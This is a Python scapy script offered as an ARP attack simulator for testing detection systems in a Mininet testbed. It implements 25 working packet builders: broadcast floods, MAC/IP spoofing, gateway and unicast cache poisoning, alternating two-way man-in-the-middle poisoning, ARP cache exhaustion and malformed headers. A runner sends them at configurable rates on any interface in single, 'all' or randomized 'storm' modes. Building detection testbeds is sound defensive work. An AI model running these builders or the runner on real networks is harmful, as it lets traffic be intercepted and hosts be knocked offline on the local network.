#!/usr/bin/env python3
"""
arp_attack_suite.py  —  Real-world ARP attack simulator (25 attack types)

Simulates a wide variety of real ARP-layer attacks for testing detection
systems: volume floods, MAC/IP spoofing, ARP cache poisoning, MITM,
header anomalies, reconnaissance scans, and malformed packets.

Usage (from Mininet CLI):
    # List all available attacks:
    mininet> h1 python3 .../arp_attack_suite.py --list

    # Run one specific attack for 60 seconds:
    mininet> h1 python3 .../arp_attack_suite.py --iface h1-eth0 \
                --attack poison_gateway --duration 60 --pps 500

    # Cycle through ALL 25 attacks back-to-back (full demo):
    mininet> h1 python3 .../arp_attack_suite.py --iface h1-eth0 \
                --attack all --duration 500 --pps 800

    # Rotate through a random subset forever until killed:
    mininet> h1 python3 .../arp_attack_suite.py --iface h1-eth0 \
                --attack storm --duration 300 --pps 1500
"""

import argparse
import random
import sys
import time

try:
    from scapy.all import Ether, ARP, sendp, get_if_hwaddr, get_if_addr
except ImportError:
    sys.stderr.write("scapy not installed. Run: sudo apt install python3-scapy\n")
    sys.exit(1)


BCAST_MAC = "ff:ff:ff:ff:ff:ff"
ZERO_MAC  = "00:00:00:00:00:00"

# All 16 host IPs in your testbed
ALL_HOST_IPS = [f"10.{sw}.{j}.1" for sw in (1, 2) for j in range(1, 9)]


def rand_mac(prefix="00:de:ad"):
    return "%s:%02x:%02x:%02x" % (
        prefix, random.randint(0, 255),
        random.randint(0, 255), random.randint(0, 255))


def rand_ip():
    return "10.%d.%d.%d" % (
        random.randint(1, 2),
        random.randint(0, 255),
        random.randint(1, 254))


class Ctx:
    """Attack state carried across packet builds."""
    def __init__(self, iface, real_mac, real_ip):
        self.iface = iface
        self.real_mac = real_mac
        self.real_ip = real_ip
        self.counter = 0
        self.cache = {}


# ══════════════════════════════════════════════════════════════════════
# 25 ATTACK BUILDERS
# Each returns one scapy packet. Stateful ones use ctx.counter/cache.
# ══════════════════════════════════════════════════════════════════════

# ── Category 1: Volume floods ─────────────────────────────────────────

def a01_flood_basic(ctx):
    """Basic broadcast flood, one fixed target. Pure rate attack."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a02_flood_random_target(ctx):
    """Broadcast flood, random targets. Hits unique-target detection."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst=rand_ip()))


def a03_spoof_mac(ctx):
    """Random source MAC, real IP. Defeats simple MAC-based rate limits."""
    fake_mac = rand_mac()
    return (Ether(src=fake_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=fake_mac, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a04_spoof_ip(ctx):
    """Random source IP, real MAC. Pretends to be many hosts."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc=rand_ip(),
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a05_spoof_both(ctx):
    """Random MAC AND IP. Classic distributed-flood simulation."""
    m = rand_mac(); i = rand_ip()
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=m, psrc=i, hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a06_mac_rotation(ctx):
    """Cycles through 50 fake MACs. Simulates MAC-flood cache exhaustion."""
    if "mac_pool" not in ctx.cache:
        ctx.cache["mac_pool"] = [rand_mac() for _ in range(50)]
    m = ctx.cache["mac_pool"][ctx.counter % 50]
    ctx.counter += 1
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=m, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


# ── Category 2: Reconnaissance / scans ────────────────────────────────

def a07_scan_sweep(ctx):
    """Sequential ARP sweep across the /8. Recon before attack."""
    ctx.counter += 1
    tgt = ALL_HOST_IPS[ctx.counter % len(ALL_HOST_IPS)]
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst=tgt))


def a08_scan_random(ctx):
    """Random ARP probes. Slower recon, harder to detect by pattern."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst=rand_ip()))


# ── Category 3: Gratuitous ARP ────────────────────────────────────────

def a09_gratuitous_self(ctx):
    """Gratuitous ARP claiming own IP. Legit protocol, excess volume = attack."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc=ctx.real_ip,
                hwdst=BCAST_MAC, pdst=ctx.real_ip))


def a10_gratuitous_spoofed(ctx):
    """Gratuitous ARP with random sender. Injects fake identities."""
    m = rand_mac(); i = rand_ip()
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=m, psrc=i, hwdst=BCAST_MAC, pdst=i))


# ── Category 4: ARP cache poisoning ───────────────────────────────────

def a11_poison_gateway(ctx):
    """Broadcast ARP reply claiming to be the gateway (10.1.1.1)."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=2, hwsrc=ctx.real_mac, psrc="10.1.1.1",
                hwdst=BCAST_MAC, pdst="10.1.1.1"))


def a12_poison_unicast(ctx):
    """Unicast ARP reply to a victim — classic MITM poisoning."""
    victim = random.choice(ALL_HOST_IPS)
    victim_mac = "00:00:00:00:%02x:%02x" % (
        int(victim.split('.')[1]), int(victim.split('.')[2]))
    return (Ether(src=ctx.real_mac, dst=victim_mac) /
            ARP(op=2, hwsrc=ctx.real_mac, psrc="10.1.1.1",
                hwdst=victim_mac, pdst=victim))


def a13_poison_mitm(ctx):
    """Alternating poison: tell h2 we're h3, then tell h3 we're h2."""
    pair = [("10.1.2.1", "10.1.3.1"), ("10.1.3.1", "10.1.2.1")]
    victim_ip, fake_ip = pair[ctx.counter % 2]
    ctx.counter += 1
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=2, hwsrc=ctx.real_mac, psrc=fake_ip,
                hwdst=BCAST_MAC, pdst=victim_ip))


def a14_reply_broadcast(ctx):
    """ARP replies sent to broadcast (unusual — replies should be unicast)."""
    m = rand_mac()
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=2, hwsrc=m, psrc=rand_ip(),
                hwdst=BCAST_MAC, pdst=rand_ip()))


def a15_reply_flood_fast(ctx):
    """Rapid unsolicited ARP replies. Poisons every cache that receives them."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=2, hwsrc=ctx.real_mac, psrc=rand_ip(),
                hwdst=BCAST_MAC, pdst=rand_ip()))


# ── Category 5: Header anomalies / malformed ──────────────────────────

def a16_mac_mismatch(ctx):
    """Ethernet src MAC != ARP hwsrc. Strong anomaly signal."""
    eth_mac = rand_mac("00:aa:bb")
    arp_mac = rand_mac("00:cc:dd")
    return (Ether(src=eth_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=arp_mac, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a17_invalid_opcode(ctx):
    """ARP opcode that isn't 1 (req) or 2 (reply). Protocol violation."""
    bad_op = random.choice([3, 4, 8, 99, 255])
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=bad_op, hwsrc=ctx.real_mac, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a18_zero_sender_ip(ctx):
    """Sender IP = 0.0.0.0. Looks like an ARP probe but flooded."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ctx.real_mac, psrc="0.0.0.0",
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a19_zero_sender_mac(ctx):
    """Sender hardware = 00:00:00:00:00:00. Invalid but common in attacks."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=ZERO_MAC, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a20_bcast_sender_mac(ctx):
    """Sender MAC = ff:ff:ff:ff:ff:ff. Illegal — broadcast can't send."""
    return (Ether(src=BCAST_MAC, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=BCAST_MAC, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a21_mcast_sender_mac(ctx):
    """Sender MAC has multicast bit set. Invalid for source."""
    m = "01:00:5e:%02x:%02x:%02x" % (
        random.randint(0, 127),
        random.randint(0, 255),
        random.randint(0, 255))
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=m, psrc=ctx.real_ip,
                hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a22_wrong_hwtype(ctx):
    """hw_type != 1 (Ethernet). Should be rejected by sane stacks."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(hwtype=0x9999, op=1, hwsrc=ctx.real_mac,
                psrc=ctx.real_ip, hwdst=ZERO_MAC, pdst="10.2.1.1"))


def a23_wrong_ptype(ctx):
    """proto_type != 0x0800 (IPv4). Protocol-level anomaly."""
    return (Ether(src=ctx.real_mac, dst=BCAST_MAC) /
            ARP(ptype=0x1234, op=1, hwsrc=ctx.real_mac,
                psrc=ctx.real_ip, hwdst=ZERO_MAC, pdst="10.2.1.1"))


# ── Category 6: Mixed / combo ─────────────────────────────────────────

def a24_mixed_req_rep(ctx):
    """50/50 mix of ARP requests and replies with spoofed sources."""
    ctx.counter += 1
    op = 1 if (ctx.counter % 2 == 0) else 2
    m = rand_mac(); i = rand_ip()
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=op, hwsrc=m, psrc=i, hwdst=BCAST_MAC, pdst=rand_ip()))


def a25_cache_overflow(ctx):
    """Massive unique (IP, MAC) pairs. Exhausts ARP cache on victims."""
    ctx.counter += 1
    i = "10.%d.%d.%d" % (
        random.randint(1, 2),
        (ctx.counter >> 8) & 0xFF,
        ctx.counter & 0xFF)
    m = "02:ca:%02x:%02x:%02x:%02x" % (
        (ctx.counter >> 24) & 0xFF,
        (ctx.counter >> 16) & 0xFF,
        (ctx.counter >> 8) & 0xFF,
        ctx.counter & 0xFF)
    return (Ether(src=m, dst=BCAST_MAC) /
            ARP(op=1, hwsrc=m, psrc=i, hwdst=ZERO_MAC, pdst="10.2.1.1"))


# ══════════════════════════════════════════════════════════════════════
# Registry
# ══════════════════════════════════════════════════════════════════════

ATTACKS = [
    ("flood_basic",        a01_flood_basic,       "Basic broadcast flood, fixed target"),
    ("flood_random_tgt",   a02_flood_random_target,"Broadcast flood, random targets"),
    ("spoof_mac",          a03_spoof_mac,         "Random src MAC, real src IP"),
    ("spoof_ip",           a04_spoof_ip,          "Real src MAC, random src IP"),
    ("spoof_both",         a05_spoof_both,        "Random MAC + random IP"),
    ("mac_rotation",       a06_mac_rotation,      "Cycle through 50 fake MACs"),
    ("scan_sweep",         a07_scan_sweep,        "Sequential ARP sweep"),
    ("scan_random",        a08_scan_random,       "Random ARP probes"),
    ("gratuitous_self",    a09_gratuitous_self,   "GARP claiming own IP"),
    ("gratuitous_spoof",   a10_gratuitous_spoofed,"GARP with spoofed identities"),
    ("poison_gateway",     a11_poison_gateway,    "Broadcast reply as gateway"),
    ("poison_unicast",     a12_poison_unicast,    "Unicast MITM poison reply"),
    ("poison_mitm",        a13_poison_mitm,       "Alternating two-way MITM"),
    ("reply_broadcast",    a14_reply_broadcast,   "ARP replies sent to broadcast"),
    ("reply_flood",        a15_reply_flood_fast,  "Rapid unsolicited replies"),
    ("mac_mismatch",       a16_mac_mismatch,      "Eth src MAC != ARP hwsrc"),
    ("invalid_opcode",     a17_invalid_opcode,    "Opcode not 1 or 2"),
    ("zero_sender_ip",     a18_zero_sender_ip,    "Sender IP = 0.0.0.0"),
    ("zero_sender_mac",    a19_zero_sender_mac,   "Sender MAC = 00:00:00:00:00:00"),
    ("bcast_sender_mac",   a20_bcast_sender_mac,  "Sender MAC = broadcast (illegal)"),
    ("mcast_sender_mac",   a21_mcast_sender_mac,  "Sender MAC multicast bit set"),
    ("wrong_hwtype",       a22_wrong_hwtype,      "hw_type != Ethernet"),
    ("wrong_ptype",        a23_wrong_ptype,       "proto_type != IPv4"),
    ("mixed_req_rep",      a24_mixed_req_rep,     "50/50 req+reply with spoofs"),
    ("cache_overflow",     a25_cache_overflow,    "Massive unique (IP,MAC) pairs"),
]

ATTACK_MAP = {name: (fn, desc) for name, fn, desc in ATTACKS}


def list_attacks():
    print("\nAvailable ARP attacks (25 total):\n")
    for i, (name, _, desc) in enumerate(ATTACKS, 1):
        print(f"  {i:2d}. {name:20s}  {desc}")
    print("\nSpecial modes:")
    print("     all                   Run every attack back-to-back")
    print("     storm                 Randomly rotate attacks every 3s")
    print()


def run_single(ctx, attack_fn, duration, pps, label):
    """Run one attack function for `duration` seconds at ~pps rate."""
    batch_size = max(10, pps // 10)
    batch_interval = batch_size / pps
    t_start = time.time()
    t_end = t_start + duration
    sent = 0
    last_report = t_start

    while time.time() < t_end:
        bs = time.time()
        batch = [attack_fn(ctx) for _ in range(batch_size)]
        try:
            sendp(batch, iface=ctx.iface, verbose=False)
        except Exception as e:
            sys.stderr.write(f"[{label}] send error: {e}\n")
        sent += batch_size
        now = time.time()
        if now - last_report >= 5.0:
            elapsed = now - t_start
            print(f"  [{label}] +{elapsed:5.1f}s sent={sent:>7} "
                  f"rate={sent/elapsed:.0f}pps")
            last_report = now
        slept = time.time() - bs
        if slept < batch_interval:
            time.sleep(batch_interval - slept)
    return sent


def main():
    ap = argparse.ArgumentParser(description="Comprehensive ARP attack simulator")
    ap.add_argument("--iface", help="Interface (e.g. h1-eth0)")
    ap.add_argument("--attack", help="Attack name, 'all', or 'storm'")
    ap.add_argument("--duration", type=int, default=60,
                    help="Total duration in seconds (default: 60)")
    ap.add_argument("--pps", type=int, default=1000,
                    help="Target packets per second (default: 1000)")
    ap.add_argument("--list", action="store_true", help="List attacks and exit")
    args = ap.parse_args()

    if args.list or not args.attack:
        list_attacks()
        return

    if not args.iface:
        sys.stderr.write("--iface required\n")
        sys.exit(1)

    try:
        real_mac = get_if_hwaddr(args.iface)
        real_ip = get_if_addr(args.iface)
    except Exception as e:
        sys.stderr.write(f"Failed to read iface {args.iface}: {e}\n")
        sys.exit(1)

    ctx = Ctx(args.iface, real_mac, real_ip)

    print(f"[attack_suite] iface={args.iface}  src={real_ip} ({real_mac})")
    print(f"[attack_suite] mode={args.attack}  duration={args.duration}s  pps={args.pps}")

    t0 = time.time()

    if args.attack == "all":
        # Split duration evenly across all 25 attacks
        per_attack = max(3, args.duration // len(ATTACKS))
        print(f"[attack_suite] Running ALL {len(ATTACKS)} attacks, "
              f"~{per_attack}s each\n")
        total = 0
        for i, (name, fn, desc) in enumerate(ATTACKS, 1):
            print(f"[{i:2d}/{len(ATTACKS)}] {name} — {desc}")
            total += run_single(ctx, fn, per_attack, args.pps, name)
            ctx.counter = 0  # reset per-attack state
        dt = time.time() - t0
        print(f"\n[attack_suite] DONE. total_sent={total} in {dt:.1f}s")

    elif args.attack == "storm":
        # Randomly rotate attacks every 3 seconds for the full duration
        print(f"[attack_suite] STORM mode: random attack rotation every 3s\n")
        total = 0
        while time.time() - t0 < args.duration:
            name, fn, desc = random.choice(ATTACKS)
            chunk = min(3, args.duration - (time.time() - t0))
            if chunk <= 0:
                break
            print(f"  [storm] -> {name}")
            total += run_single(ctx, fn, int(chunk), args.pps, name)
            ctx.counter = 0
        dt = time.time() - t0
        print(f"\n[attack_suite] DONE. total_sent={total} in {dt:.1f}s")

    else:
        if args.attack not in ATTACK_MAP:
            sys.stderr.write(f"Unknown attack: {args.attack}\n")
            sys.stderr.write("Run with --list to see all attacks\n")
            sys.exit(1)
        fn, desc = ATTACK_MAP[args.attack]
        print(f"[attack_suite] {args.attack} — {desc}\n")
        sent = run_single(ctx, fn, args.duration, args.pps, args.attack)
        dt = time.time() - t0
        print(f"\n[attack_suite] DONE. sent={sent} in {dt:.1f}s "
              f"(~{sent/dt:.0f} pps)")


if __name__ == "__main__":
    main()
